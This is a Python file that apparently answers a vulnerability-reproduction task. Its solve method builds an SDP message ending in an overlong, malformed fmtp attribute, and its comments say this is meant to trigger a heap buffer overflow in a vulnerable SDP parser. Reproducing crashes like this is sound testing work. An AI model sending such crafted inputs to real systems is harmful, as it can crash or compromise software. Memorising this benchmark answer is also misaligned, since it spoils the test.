import os


class Solution:
    def solve(self, src_path: str) -> bytes:
        sdp_poc = (
            "v=0\r\n"
            "o=- 0 0 IN IP4 127.0.0.1\r\n"
            "s=Heap Buffer Overflow SDP PoC\r\n"
            "c=IN IP4 127.0.0.1\r\n"
            "t=0 0\r\n"
            "m=audio 49170 RTP/AVP 0 96\r\n"
            "a=rtpmap:0 PCMU/8000\r\n"
            "a=rtpmap:96 opus/48000/2\r\n"
            "a=sendrecv\r\n"
            "a=setup:actpass\r\n"
            "a=connection:new\r\n"
            "a=ice-ufrag:abcd\r\n"
            "a=ice-pwd:efghijklmnopqrstuvwxyz0123456789\r\n"
            "a=candidate:1 1 UDP 2130706431 192.0.2.1 54400 typ host\r\n"
            "a=candidate:2 1 UDP 1694498815 198.51.100.1 54401 typ srflx raddr 0.0.0.0 rport 0\r\n"
            "a=end-of-candidates\r\n"
            "a=mid:audio\r\n"
            "a=extmap:1 urn:ietf:params:rtp-hdrext:ssrc-audio-level\r\n"
            "a=extmap:2 urn:ietf:params:rtp-hdrext:sdes:mid\r\n"
            "a=recvonly\r\n"
            "a=inactive\r\n"
            "a=ptime:20\r\n"
            "a=maxptime:60\r\n"
            "a=rtcp-mux\r\n"
            "a=rtcp-rsize\r\n"
            "a=ssrc:123456 cname:overflow-test\r\n"
            "a=ssrc:123456 msid:overflow overflow-audio\r\n"
            "a=ssrc:123456 mslabel:overflow\r\n"
            "a=ssrc:123456 label:overflow-audio\r\n"
            "a=fingerprint:sha-256 "
            "AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99:"
            "AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99\r\n"
            "a=group:BUNDLE audio\r\n"
            "a=rtcp:49172 IN IP4 127.0.0.1\r\n"
            # The following fmtp attribute is intentionally malformed and very long,
            # without expected separators, to stress the SDP attribute parser and
            # trigger the heap buffer overflow in the vulnerable version.
            "a=fmtp:96 level-asymmetry-allowed=1"
        )

        # Append a very long value without normal separators like ';' or spaces
        # to push the internal pointer-based parser past the end of the value.
        long_tail = "X" * 800

        sdp_poc += long_tail + "\r\n"

        return sdp_poc.encode("ascii", errors="ignore")